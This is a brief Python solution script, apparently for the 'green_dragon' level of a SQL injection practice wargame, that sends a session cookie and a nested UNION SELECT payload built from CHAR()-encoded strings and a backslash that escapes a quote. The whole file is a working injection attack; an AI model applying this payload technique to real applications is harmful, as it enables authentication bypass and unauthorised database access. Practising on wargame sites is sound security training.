import requests

url = "https://los.rubiya.kr/chall/green_dragon_74d944f888fd3f9cf76e4e230e78c45b.php"
cookie = { "PHPSESSID" : "qqb41s240ko1ri41qacqvuuqgv" }

admin = list(map(ord,"admin"))
admin = ','.join(list(map(str,admin)))
pw = list(map(ord,f"union select char({admin})#"))
pw = ','.join(list(map(str,pw)))
id = '\\'
payload = f"union select char({ord(id)}),char({pw})#"

if requests.get(url,{"id":id,"pw":payload},cookies=cookie).text.find("Clear!") > 0: print("[*] Success")
